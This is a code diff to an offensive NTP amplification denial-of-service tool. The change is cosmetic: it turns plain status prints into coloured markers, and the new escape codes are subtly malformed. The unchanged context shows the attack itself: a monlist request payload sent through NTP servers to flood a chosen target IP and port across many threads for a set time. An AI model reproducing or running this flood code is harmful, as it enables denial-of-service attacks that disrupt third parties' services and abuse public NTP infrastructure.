@@ -35,7 +35,7 @@ def NTP_ATTACK(threads, attack_time, target):
 	target_ip = target.split(":")[0]
 	target_port = int(target.split(":")[1])
 
-	print("[BEGIN] Attack started for " + str(attack_time) + " seconds...")
+	print('\033[1;34'+"[*]"+'\033[0m'+" Attack started for " + str(attack_time) + " seconds...")
 	
 	# Payload
 	payload = ("\x17\x00\x03\x2a" + "\x00" * 4)
@@ -60,11 +60,11 @@ def NTP_ATTACK(threads, attack_time, target):
 					except Exception as e:
 						print(e)
 					else:
-						print("[BEGIN] Sending " + str(packets) + " packets from NTP server: " + server + " to " + target)
+						print('\033[1;34'+"[*]"+'\033[0m'+" Sending " + str(packets) + " packets from NTP server: " + server + " to " + target)
 
 	# Start threads
 	for thread in range(threads):
-		print("[BEGIN] Staring thread " + str(thread) + "...")
+		print('\033[1;34'+"[*]"+'\033[0m'+" Staring thread " + str(thread) + "...")
 		t = Thread(target = ntp_flood)
 		t.start()
 		threads_list.append(t)
@@ -75,4 +75,4 @@ def NTP_ATTACK(threads, attack_time, target):
 		FINISH = True
 		thread.join()
 	
-	print("[WARNING] NTP attack stopped!")
+	print('\033[1;33'+"[!]"+'\033[0m'+" NTP attack stopped!")
